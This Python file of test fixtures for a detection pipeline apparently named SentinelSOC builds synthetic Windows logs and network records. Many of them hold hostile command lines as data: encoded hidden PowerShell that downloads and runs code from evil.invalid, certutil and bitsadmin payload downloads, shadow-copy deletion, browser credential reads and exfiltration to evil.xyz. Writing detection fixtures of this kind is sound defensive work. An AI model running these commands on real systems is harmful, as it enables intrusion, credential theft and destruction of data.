"""Test fixture record builders.

SentinelSOC is a pure-live analyzer; these builders create deterministic
raw collector-shaped records so unit tests can exercise the pipeline
without a runtime simulator. They are NOT registered collectors and are
never used by the live SOC.
"""
from __future__ import annotations

from datetime import datetime, timedelta, timezone

from backend.analyzers.normalizer import Normalizer


def _ts(offset_minutes: float = 0.0) -> datetime:
    return datetime.now(timezone.utc) + timedelta(minutes=offset_minutes)


def _ts_seconds(offset_seconds: float = 0.0) -> datetime:
    return datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)


def logon_failure(user: str = "administrator", source_ip: str = "192.168.99.77", event_id: int = 4625) -> dict:
    return {
        "source": "eventlog",
        "channel": "Security",
        "event_id": event_id,
        "timestamp": _ts(-1).isoformat(),
        "user": user,
        "message": (
            f"An account failed to log on. Account Name: {user}. "
            f"Source Network Address: {source_ip}. Logon Type: 3. "
            f"Sub Status: 0xC000006A."
        ),
        "raw": {"logon_type": 3, "source_ip": source_ip, "sub_status": "0xC000006A"},
    }


def brute_force(attempts: int = 12, user: str = "administrator") -> list[dict]:
    out = []
    for i in range(attempts):
        rec = logon_failure(user=user)
        rec["timestamp"] = _ts(-1 - i * 0.1).isoformat()
        out.append(rec)
    out.append({
        "source": "eventlog", "channel": "Security", "event_id": 4624,
        "timestamp": _ts(-0.5).isoformat(), "user": "alice",
        "message": "An account was successfully logged on. Account Name: alice. Logon Type: 2.",
        "raw": {"logon_type": 2, "source_ip": "127.0.0.1"},
    })
    return out


def suspicious_powershell() -> list[dict]:
    payload = "powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAKAAiAGQAbwB3AG4AbABvAGEAZAAiACkA"
    return [{
        "source": "powershell",
        "channel": "Microsoft-Windows-PowerShell/Operational",
        "event_id": 4104,
        "timestamp": _ts(-1).isoformat(),
        "user": "alice",
        "message": f"Creating Scriptblock text (1 of 1): {payload}",
        "raw": {
            "script_block": payload,
            "command_line": payload,
            "has_encoded": True,
            "has_download": True,
            "has_hidden": True,
        },
    }]


def privilege_escalation(user: str = "erin", new_admin: str = "backdoor_admin") -> list[dict]:
    return [
        {
            "source": "eventlog", "channel": "Security", "event_id": 4720,
            "timestamp": _ts(-2).isoformat(), "user": user,
            "message": f"A user account was created. Account Name: {new_admin}.",
            "raw": {"new_account": new_admin},
        },
        {
            "source": "eventlog", "channel": "Security", "event_id": 4732,
            "timestamp": _ts(-1).isoformat(), "user": user,
            "message": f"A member was added to a security-enabled local group. Member: {new_admin}. Group: Administrators.",
            "raw": {"new_account": new_admin, "group_sid": "S-1-5-32-544", "group": "Administrators"},
        },
        {
            "source": "eventlog", "channel": "Security", "event_id": 4672,
            "timestamp": _ts(-0.5).isoformat(), "user": new_admin,
            "message": "Special privileges assigned to new logon. Account Name: " + new_admin + ".",
            "raw": {},
        },
    ]


def persistence() -> list[dict]:
    binary = "C:\\Users\\Public\\svchost.exe"
    return [
        {
            "source": "eventlog", "channel": "System", "event_id": 7045,
            "timestamp": _ts(-3).isoformat(), "user": "SYSTEM",
            "message": f"A service was installed. Service Name: WindowsUpdateSvc. Service File Name: {binary}.",
            "raw": {"service_name": "WindowsUpdateSvc", "image_path": binary},
        },
        {
            "source": "eventlog", "channel": "Security", "event_id": 4698,
            "timestamp": _ts(-2).isoformat(), "user": "erin",
            "message": f"A scheduled task was created. Task Name: PersistenceTask. Executes {binary}.",
            "raw": {"task_name": "PersistenceTask", "image_path": binary},
        },
    ]


def port_scan(ports: int = 30) -> list[dict]:
    out = []
    for i in range(ports):
        out.append({
            "source": "network", "pid": 4422, "process": "nmap.exe",
            "local_ip": "192.168.99.66", "local_port": 40000 + i,
            "remote_ip": "10.0.0.4", "remote_port": 1 + (i * 137) % 65535,
            "state": "SYN_SENT", "is_listening": False,
            "timestamp": _ts_seconds(-i * 2).isoformat(),
        })
    return out


def lateral_movement() -> list[dict]:
    out: list[dict] = []
    for i, target in enumerate(["10.0.0.5", "10.0.0.6", "10.0.0.7"]):
        out.append({
            "source": "network", "pid": 5432, "process": "explorer.exe",
            "local_ip": "192.168.1.55", "local_port": 50000 + i,
            "remote_ip": target, "remote_port": 445,
            "state": "ESTABLISHED", "is_listening": False,
            "timestamp": _ts(-1 - i).isoformat(),
        })
    return out


def data_staging() -> list[dict]:
    return [
        {
            "source": "eventlog", "channel": "Security", "event_id": 4688,
            "timestamp": _ts(-2).isoformat(), "user": "carol",
            "message": "A new process has been created. Command Line: 7z.exe a -r C:\\Temp\\data.7z C:\\Users\\Public\\Documents\\*",
            "raw": {"command_line": "7z.exe a -r C:\\Temp\\data.7z C:\\Users\\Public\\Documents\\*"},
        },
        {
            "source": "eventlog", "channel": "Security", "event_id": 4688,
            "timestamp": _ts(-1.5).isoformat(), "user": "carol",
            "message": "A new process has been created. Command Line: 7z.exe a -r C:\\Temp\\backup.7z C:\\Users\\carol\\Desktop\\*",
            "raw": {"command_line": "7z.exe a -r C:\\Temp\\backup.7z C:\\Users\\carol\\Desktop\\*"},
        },
    ]


def malicious_file() -> list[dict]:
    return [{
        "source": "malware",
        "file_path": "C:\\Users\\Public\\beacon.exe",
        "file_name": "beacon.exe",
        "sha256": "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f",
        "md5": "",
        "size": 12345,
        "signed": False,
        "is_malicious": True,
        "signature_name": "known-bad-sample",
        "timestamp": _ts(-1).isoformat(),
    }]


def phishing_email() -> list[dict]:
    return [{
        "source": "email",
        "sender": "noreply@accounts-update.tk",
        "recipient": "alice@corp.local",
        "subject": "URGENT: verify your account password now",
        "body": "Your account will be suspended. Click https://evil.tk/login to verify. Attachment: invoice.exe",
        "attachment_types": ".exe",
        "ip_address": "203.0.113.7",
        "timestamp": _ts(-1).isoformat(),
    }]


def usb_device() -> list[dict]:
    return [{
        "source": "usb",
        "device_name": "Kingston DataTraveler",
        "device_id": "USB\\VID_0951&PID_1666\\07018AC27C",
        "vendor": "Kingston",
        "serial": "07018AC27C",
        "timestamp": _ts(-1).isoformat(),
    }]


def dns_exfil() -> list[dict]:
    return [{
        "source": "dns", "process": "svchost.exe", "pid": 500,
        "query": f"data{i}.evil.xyz", "response": "8.8.4.4",
        "response_size": 600, "timestamp": _ts(-1 - i).isoformat(),
    } for i in range(25)]


def http_exfil() -> list[dict]:
    return [{
        "source": "http", "process": "powershell.exe", "pid": 1234,
        "method": "POST", "url": "https://evil.xyz/upload",
        "host": "evil.xyz", "status_code": 200,
        "request_body_size": 2_000_000, "response_body_size": 5_000_000,
        "timestamp": _ts(-1).isoformat(),
    }]


def _process(name: str, cmdline: str, path: str | None = None, pid: int = 1000,
             user: str = "alice", parent: str = "explorer.exe", ppid: int = 900) -> dict:
    return {
        "source": "process", "pid": pid, "ppid": ppid,
        "name": name, "path": path or f"C:\\Windows\\System32\\{name}",
        "cmdline": cmdline,
        "raw": {"cmdline": cmdline},
        "parent_name": parent, "user": user,
        "is_new": True, "timestamp": _ts(-1).isoformat(),
    }


def sysmon_lsass_dump(process: str = "powershell.exe") -> list[dict]:
    return [{
        "source": "eventlog", "channel": "Sysmon", "event_id": 10,
        "timestamp": _ts(-1).isoformat(), "user": "alice",
        "message": (
            f"Process accessed: C:\\Windows\\system32\\lsass.exe by "
            f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{process} "
            f"(GrantedAccess: 0x1010)."
        ),
        "raw": {
            "image": f"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\{process}",
            "target_image": "C:\\Windows\\system32\\lsass.exe",
            "granted_access": "0x1010",
        },
    }]


def sysmon_lsass_benign() -> list[dict]:
    return [{
        "source": "eventlog", "channel": "Sysmon", "event_id": 10,
        "timestamp": _ts(-1).isoformat(), "user": "SYSTEM",
        "message": "Process accessed: C:\\Windows\\system32\\lsass.exe by C:\\Windows\\System32\\svchost.exe (GrantedAccess: 0x0).",
        "raw": {
            "image": "C:\\Windows\\System32\\svchost.exe",
            "target_image": "C:\\Windows\\system32\\lsass.exe",
            "granted_access": "0x0",
        },
    }]


def sysmon_runkey(image: str = "C:\\Users\\Public\\svc.exe",
                  details: str = "C:\\Users\\Public\\svc.exe") -> list[dict]:
    return [{
        "source": "eventlog", "channel": "Sysmon", "event_id": 13,
        "timestamp": _ts(-1).isoformat(), "user": "alice",
        "message": (
            f"Registry value SetValue: "
            f"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefender = "
            f"{details} by {image}."
        ),
        "raw": {
            "image": image, "event_type": "SetValue",
            "target_object": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefender",
            "details": details,
        },
    }]


def sysmon_benign_registry() -> list[dict]:
    return [{
        "source": "eventlog", "channel": "Sysmon", "event_id": 13,
        "timestamp": _ts(-1).isoformat(), "user": "SYSTEM",
        "message": "Registry value SetValue: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers by C:\\Windows\\System32\\svchost.exe.",
        "raw": {
            "image": "C:\\Windows\\System32\\svchost.exe", "event_type": "SetValue",
            "target_object": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers",
            "details": "netservice",
        },
    }]


def schtasks_create() -> list[dict]:
    return [
        _process(
            "schtasks.exe",
            "schtasks.exe /create /tn SystemUpdater /tr C:\\Users\\Public\\svc.exe /sc onlogon /ru SYSTEM",
            path="C:\\Windows\\System32\\schtasks.exe", pid=6001, user="erin",
        ),
    ]


def wmi_subscription() -> list[dict]:
    return [
        _process(
            "wmic.exe",
            'wmic /namespace:\\root\\subscription create __EventFilter name="UpdateFilter" '
            'Query="SELECT * FROM __InstanceCreationEvent"',
            path="C:\\Windows\\System32\\wbem\\wmic.exe", pid=7001, user="erin",
        ),
        _process(
            "powershell.exe",
            'powershell.exe -NoP -C "Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace root\\subscription ..."',
            path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid=7002, user="erin",
        ),
    ]


def admin_tampering() -> list[dict]:
    return [
        {
            "source": "eventlog", "channel": "Security", "event_id": 4724,
            "timestamp": _ts(-2).isoformat(), "user": "erin",
            "message": "A user attempted to change the password for an account. Target Account Name: administrator. Subject User Name: erin.",
            "raw": {"target_account_name": "administrator"},
        },
        {
            "source": "eventlog", "channel": "Security", "event_id": 4726,
            "timestamp": _ts(-1).isoformat(), "user": "erin",
            "message": "A user account was deleted. Deleted Account Name: backup_admin.",
            "raw": {"deleted_account": "backup_admin"},
        },
    ]


def masquerading_process() -> list[dict]:
    return [
        _process("svchost.exe", "svchost.exe -k netsvcs",
                 path="C:\\Users\\Public\\svchost.exe", pid=3001, user="alice"),
    ]


def hidden_artifact() -> list[dict]:
    return [
        _process(
            "cmd.exe",
            "cmd.exe /c type C:\\Users\\alice\\Documents\\report.txt:payload > C:\\Windows\\Temp\\payload.exe",
            path="C:\\Windows\\System32\\cmd.exe", pid=8001, user="alice",
        ),
        _process(
            "cmd.exe",
            "cmd.exe /c attrib +h +s C:\\Users\\alice\\secret.exe",
            path="C:\\Windows\\System32\\cmd.exe", pid=8002, user="alice",
        ),
    ]


def lolbin_usage() -> list[dict]:
    return [
        _process("rundll32.exe",
                 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication "',
                 path="C:\\Windows\\System32\\rundll32.exe", pid=2001, user="alice"),
        _process(
            "certutil.exe",
            "certutil.exe -urlcache -split -f http://192.168.99.5/payload.exe C:\\Users\\Public\\payload.exe",
            path="C:\\Windows\\System32\\certutil.exe", pid=2002, user="bob",
        ),
    ]


def benign_process() -> list[dict]:
    return [
        _process("svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs",
                 path="C:\\Windows\\System32\\svchost.exe", pid=4001, user="SYSTEM"),
        _process("notepad.exe", "notepad.exe C:\\Users\\alice\\notes.txt", pid=4002),
        _process("chrome.exe",
                 '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --user-data-dir',
                 path="C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", pid=4003),
        _process("powershell.exe", 'powershell.exe -NoProfile -Command "Get-Process"', pid=4004),
        _process("schtasks.exe", "schtasks.exe /query /fo LIST", pid=4005),
        _process("regsvr32.exe", "regsvr32.exe C:\\Windows\\System32\\ieframe.dll", pid=4006),
        _process("wmic.exe", "wmic cpu get name", pid=4007),
    ]


def http_volume() -> list[dict]:
    return [
        {
            "source": "http", "process": "powershell.exe", "pid": 5001,
            "method": "POST", "url": f"https://c2.evil.xyz/chunk{i}",
            "host": "c2.evil.xyz", "status_code": 200,
            "request_body_size": 1_000_000, "response_body_size": 0,
            "timestamp": _ts(-1 - i * 0.1).isoformat(),
        }
        for i in range(6)
    ]


def ransomware_impact() -> list[dict]:
    """Bulk rename to ransomware extensions + ransom-note drop (T1486)."""
    return [
        _process(
            "cmd.exe",
            r"cmd.exe /c ren C:\Users\alice\Documents\*.pdf *.pdf.locked",
            path="C:\\Windows\\System32\\cmd.exe", pid=9101, user="erin",
        ),
        _process(
            "powershell.exe",
            r'powershell.exe -NoP -C "echo PWNED pay 1 BTC > C:\Users\Public\HOW_TO_DECRYPT.txt"',
            path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid=9102, user="erin",
        ),
    ]


def recovery_inhibit() -> list[dict]:
    """Shadow-copy deletion and boot-recovery disable (T1490)."""
    return [
        _process(
            "vssadmin.exe",
            "vssadmin.exe delete shadows /all /quiet",
            path="C:\\Windows\\System32\\vssadmin.exe", pid=9201, user="SYSTEM",
        ),
        _process(
            "bcdedit.exe",
            "bcdedit.exe /set {default} recoveryenabled no",
            path="C:\\Windows\\System32\\bcdedit.exe", pid=9202, user="SYSTEM",
        ),
    ]


def credential_store_theft() -> list[dict]:
    """Credential Manager enumeration + browser credential DB reads (T1555)."""
    return [
        _process(
            "cmdkey.exe",
            "cmdkey.exe /list",
            path="C:\\Windows\\System32\\cmdkey.exe", pid=9301, user="alice",
        ),
        _process(
            "cmd.exe",
            r'cmd.exe /c type "C:\Users\alice\AppData\Local\Google\Chrome\User Data\Default\Login Data"',
            path="C:\\Windows\\System32\\cmd.exe", pid=9302, user="alice",
        ),
    ]


def bits_download() -> list[dict]:
    """BITS transfer staging a payload in a writable directory (T1197)."""
    return [
        _process(
            "bitsadmin.exe",
            r"bitsadmin.exe /transfer d /download http://192.168.99.5/p.exe C:\Users\Public\p.exe",
            path="C:\\Windows\\System32\\bitsadmin.exe", pid=9401, user="erin",
        ),
    ]


def shortcut_persistence() -> list[dict]:
    """CreateShortcut in the Startup folder pointing at a payload (T1547.009)."""
    return [
        _process(
            "powershell.exe",
            (
                'powershell.exe -NoP -C "$w=New-Object -COM WScript.Shell; $s=$w.CreateShortcut'
                r'("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svc.lnk");'
                r"$s.TargetPath='C:\Users\Public\svc.exe';$s.Save()"
            ),
            path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pid=9501, user="erin",
        ),
    ]


def log_clear() -> list[dict]:
    return [
        {
            "source": "eventlog", "channel": "Security", "event_id": 1102,
            "timestamp": _ts(-1).isoformat(), "user": "SYSTEM",
            "message": "The audit log was cleared. Subject User Name: erin.",
            "raw": {"computer": "DESKTOP"},
        },
        {
            "source": "eventlog", "channel": "Sysmon", "event_id": 23,
            "timestamp": _ts(-0.5).isoformat(), "user": "erin",
            "message": "File deleted: C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
            "raw": {"file_path": "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx"},
        },
    ]


def ml_credential_spray(attempts: int = 24) -> list[dict]:
    """Password spray from many external IPs at night with account lockouts.

    Deliberately engineered to deviate from the benign baseline in the
    ML feature space: external source IPs (203.0.113.x), night-time
    timestamps, uncommon logon types and locked-account sub-statuses.
    """
    out = []
    for i in range(attempts):
        external_ip = f"203.0.113.{1 + (i % 20)}"
        logon_type = 3 if i % 2 == 0 else 10
        sub_status = "0xC0000234" if i % 3 == 0 else "0xC000006A"
        rec = logon_failure(user=f"user{i % 8}", source_ip=external_ip)
        rec["timestamp"] = _ts_seconds(-(attempts - i) * 4).isoformat()
        rec["raw"]["logon_type"] = logon_type
        rec["raw"]["sub_status"] = sub_status
        rec["raw"]["is_locked"] = sub_status == "0xC0000234"
        stamp = datetime.now(timezone.utc).replace(
            hour=(2 + i % 3) % 24, minute=17, second=0, microsecond=0
        )
        rec["timestamp"] = stamp.isoformat()
        out.append(rec)
    out.append({
        "source": "eventlog", "channel": "Security", "event_id": 4624,
        "timestamp": datetime.now(timezone.utc).replace(hour=3, minute=1, second=0).isoformat(),
        "user": "user3",
        "message": "An account was successfully logged on. Account Name: user3. Logon Type: 10.",
        "raw": {"logon_type": 10, "source_ip": "203.0.113.9"},
    })
    return out


def ml_obfuscated_powershell(count: int = 6) -> list[dict]:
    """Encoded/hidden PowerShell with long script blocks (IEX + download)."""
    out = []
    for i in range(count):
        script = "IEX (New-Object Net.WebClient).DownloadString('https://evil.invalid/a')" * (3 + i % 3)
        out.append({
            "source": "powershell",
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "event_id": 4104,
            "timestamp": _ts_seconds(-i * 3).isoformat(),
            "user": "alice",
            "message": f"Creating Scriptblock text (1 of 1): {script}",
            "raw": {
                "script_block": script,
                "command_line": script,
                "has_encoded": True,
                "has_hidden": True,
                "has_download": True,
                "script_len": len(script),
                "cmdline_len": len(script) * 2,
            },
        })
    return out


def ml_masquerade_process() -> list[dict]:
    """Process masquerading as svchost.exe launched from a writable path."""
    return [
        {
            "source": "eventlog", "channel": "Security", "event_id": 4688,
            "timestamp": _ts_seconds(-2).isoformat(), "user": "alice",
            "message": "A new process has been created. New Process Name: C:\\Users\\Public\\svchost.exe.",
            "raw": {
                "command_line": "C:\\Users\\Public\\svchost.exe -k netsvcs -s BITS -enc JABHAE8AQQBMAFMAOgA=" * 2,
                "has_hidden": True,
                "cmdline_len": 400,
                "image_path": "C:\\Users\\Public\\svchost.exe",
            },
        },
        {
            "source": "eventlog", "channel": "Security", "event_id": 4688,
            "timestamp": _ts_seconds(-1).isoformat(), "user": "alice",
            "message": "A new process has been created. New Process Name: C:\\Users\\Public\\cmd.exe.",
            "raw": {
                "command_line": "cmd.exe /c C:\\Users\\Public\\x.exe -C:\"\"Encrypted\"\" -c 45.0.255.4:443",
                "has_hidden": True,
                "cmdline_len": 600,
                "image_path": "C:\\Users\\Public\\cmd.exe",
            },
        },
    ]


def ml_c2_beacon() -> list[dict]:
    """Encoded C2 launcher (event-based for the ML process stream) + flows."""
    out = []
    for i in range(3):
        out.append({
            "source": "eventlog", "channel": "Security", "event_id": 4688,
            "timestamp": _ts_seconds(-i * 10).isoformat(), "user": "bob",
            "message": "A new process has been created. New Process Name: powershell.exe.",
            "raw": {
                "command_line": "powershell.exe -NoP -W Hidden -enc SQBFAFgAKAAiAGQAbwB3AG4AbABvAGEAZAAiACkA" * 2,
                "has_encoded": True,
                "has_hidden": True,
                "has_download": True,
                "cmdline_len": 700,
            },
        })
    for i in range(4):
        out.append({
            "source": "network", "pid": 9000 + i, "process": "powershell.exe",
            "local_ip": "192.168.1.20", "local_port": 51000 + i,
            "remote_ip": "203.0.113.55", "remote_port": 443 + i,
            "state": "ESTABLISHED", "is_listening": False,
            "bytes_sent": 4_000_000 + i * 100_000,
            "bytes_recv": 1_000_000 + i * 50_000,
            "duration_seconds": 900.0 + i * 60.0,
            "timestamp": _ts_seconds(-i * 15).isoformat(),
        })
    return out


def ml_network_exfil(count: int = 3) -> list[dict]:
    """High-rate flows to a novel external C2 subnet (network stream).

    High rate (big bytes over a short window) is what separates real mass
    exfiltration from benign traffic and from slow drip leaks.
    """
    out = []
    for i in range(count):
        out.append({
            "source": "network", "pid": 9500 + i, "process": "svchost.exe",
            "local_ip": "192.168.1.20", "local_port": 52000 + i,
            "remote_ip": f"45.0.255.{i + 2}", "remote_port": 8443,
            "state": "ESTABLISHED", "is_listening": False,
            "bytes_sent": 20_000_000 + i * 5_000_000,
            "bytes_recv": 40_000_000 + i * 10_000_000,
            "duration_seconds": 120.0 + i * 60.0,
            "timestamp": _ts_seconds(-i * 20).isoformat(),
        })
    return out


def ml_implant_drop(count: int = 6) -> list[dict]:
    """Encoded implant dropper launched from a temp dir (trains process stream).

    Long + encoded cmdlines, hidden windows, writable-dir paths: the same
    signals a masquerading attacker uses, so the process IsolationForest and
    the supervised classifier learn this region during training.
    """
    out = []
    for i in range(count):
        out.append({
            "source": "eventlog", "channel": "Security", "event_id": 4688,
            "timestamp": _ts_seconds(-i * 3).isoformat(), "user": "bob",
            "message": "A new process has been created. New Process Name: C:\\Temp\\loader.exe.",
            "raw": {
                "command_line": (
                    "C:\\Temp\\loader.exe -enc JAB1AD0AJwBIAGoAcwBkAGYAbAAnADsAaQBFAFgAICQAdQA=" * 3
                ),
                "has_encoded": True,
                "has_hidden": True,
                "has_download": True,
                "script_len": 900 + i * 50,
                "cmdline_len": 800 + i * 100,
                "image_path": "C:\\Temp\\loader.exe",
            },
        })
    return out


def ml_lateral_c2() -> list[dict]:
    """Massive novel-subnet flows to an *unseen* external C2 subnet.

    Deliberately far beyond the train-time exfil extremes (20-40 MB flows) so
    an honest threshold tuned on the training window must flag them.
    """
    out = []
    for i in range(3):
        for port in (443, 8443, 9000):
            out.append({
                "source": "network", "pid": 7000 + i, "process": "svchost.exe",
                "local_ip": "192.168.1.20", "local_port": 53000 + i,
                "remote_ip": f"198.51.100.{i + 3}", "remote_port": port,
                "state": "ESTABLISHED", "is_listening": False,
                "bytes_sent": 150_000_000 + i * 40_000_000,
                "bytes_recv": 300_000_000 + i * 80_000_000,
                "duration_seconds": 240.0 + i * 120.0,
                "timestamp": _ts_seconds(-i * 10).isoformat(),
            })
    return out


def ml_hidden_script(count: int = 6) -> list[dict]:
    """Hidden window script execution from a writable download dir (train).

    Same region as masquerading (hidden + writable path + long argv) but a
    different binary/signature than the hold-out masquerade scenario, so the
    supervised layer generalises without leaking the hold-out test.
    """
    out = []
    for i in range(count):
        out.append({
            "source": "eventlog", "channel": "Security", "event_id": 4688,
            "timestamp": _ts_seconds(-i * 2).isoformat(), "user": "carol",
            "message": "A new process has been created. New Process Name: wscript.exe.",
            "raw": {
                "command_line": (
                    "wscript.exe //B C:\\Users\\carol\\Downloads\\invoice-check.vbs "
                    "CreateObject(\"WScript.Shell\").Run \"bitsadmin /transfer d C:\\Temp\\b.bin\""
                ),
                "has_hidden": True,
                "cmdline_len": 480 + i * 40,
                "image_path": "C:\\Windows\\System32\\wscript.exe",
            },
        })
    return out


_BENIGN_REMOTE_IPS = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "8.8.4.4"]


def benign_baseline(n: int = 60) -> list[dict]:
    users = ["alice", "bob", "carol", "dave"]
    out: list[dict] = []
    for i in range(n):
        user = users[i % len(users)]
        kind = i % 4
        if kind == 0:
            out.append({
                "source": "eventlog", "channel": "Security", "event_id": 4624,
                "timestamp": _ts(-i * 0.5).isoformat(), "user": user,
                "message": "An account was successfully logged on. Account Name: " + user + ".",
                "raw": {"logon_type": 2},
            })
        elif kind == 1:
            out.append({
                "source": "eventlog", "channel": "Security", "event_id": 4688,
                "timestamp": _ts(-i * 0.5).isoformat(), "user": user,
                "message": "A new process has been created. New Process Name: C:\\Windows\\System32\\notepad.exe.",
                "raw": {"new_process": "notepad.exe"},
            })
        elif kind == 2:
            failure = logon_failure(user=user, source_ip=f"192.168.1.{10 + (i % 20)}")
            failure["timestamp"] = _ts(-i * 0.5).isoformat()
            out.append(failure)
        else:
            out.append({
                "source": "network", "pid": 1234, "process": "chrome.exe",
                "local_ip": "192.168.1.20", "local_port": 50000,
                "remote_ip": _BENIGN_REMOTE_IPS[(i // 4) % len(_BENIGN_REMOTE_IPS)],
                "remote_port": 443, "state": "ESTABLISHED",
                "is_listening": False, "timestamp": _ts(-i * 0.5).isoformat(),
            })
    return out


def full_suite() -> list[dict]:
    records: list[dict] = []
    records += brute_force()
    records += suspicious_powershell()
    records += privilege_escalation()
    records += persistence()
    records += port_scan()
    records += lateral_movement()
    records += data_staging()
    records += malicious_file()
    records += phishing_email()
    records += usb_device()
    records += dns_exfil()
    records += http_exfil()
    records += benign_baseline(30)
    return records


def run_pipeline_records(records: list[dict]):
    """Insert raw records through the pipeline (test helper)."""
    from backend.database.connection import SessionLocal
    from backend.api.system import run_pipeline

    db = SessionLocal()
    try:
        return run_pipeline(db, records)
    finally:
        db.close()


def add_normalized(db, records: list[dict], event_only: bool = False) -> None:
    from backend.database.models import DnsQuery, EmailMessage, HttpRequest, NetworkConnection, NormalizedEvent, ProcessRecord

    for r in records:
        if r.get("source") == "email" and not event_only:
            db.add(EmailMessage(
                sender=r.get("sender", ""), recipient=r.get("recipient", ""),
                subject=r.get("subject", ""), body=r.get("body", ""),
                attachment_types=r.get("attachment_types"),
                received_at=Normalizer._safe_ts(r.get("timestamp")),
            ))
        if r.get("source") == "process" and not event_only:
            db.add(ProcessRecord(
                pid=r.get("pid", 0), ppid=r.get("ppid", 0),
                name=r.get("name", ""), path=r.get("path", ""),
                command_line=(r.get("raw") or {}).get("cmdline", ""),
                parent_name=r.get("parent_name", ""),
                user=r.get("user", ""), is_new=r.get("is_new", False),
                observed_at=Normalizer._safe_ts(r.get("timestamp")),
            ))
        elif r.get("source") == "network" and not event_only:
            db.add(NetworkConnection(
                pid=r["pid"], process=r["process"], local_ip=r["local_ip"],
                local_port=r["local_port"], remote_ip=r["remote_ip"],
                remote_port=r["remote_port"], state=r["state"],
                is_listening=r["is_listening"],
                observed_at=Normalizer._safe_ts(r["timestamp"]),
            ))
        elif r.get("source") == "http" and not event_only:
            db.add(HttpRequest(
                process=r.get("process", ""), pid=r.get("pid", 0),
                method=r.get("method", "GET"), url=r.get("url", ""),
                host=r.get("host", ""), status_code=r.get("status_code", 0),
                request_body_size=r.get("request_body_size", 0),
                response_body_size=r.get("response_body_size", 0),
                observed_at=Normalizer._safe_ts(r.get("timestamp")),
            ))
        elif r.get("source") == "dns" and not event_only:
            db.add(DnsQuery(
                process=r.get("process", ""), pid=r.get("pid", 0),
                query=r.get("query", ""), response=r.get("response", ""),
                response_size=r.get("response_size", 0),
                observed_at=Normalizer._safe_ts(r.get("timestamp")),
            ))
        elif r.get("source") in ("eventlog", "powershell"):
            db.add(NormalizedEvent(**Normalizer().normalize(r)))
    db.commit()
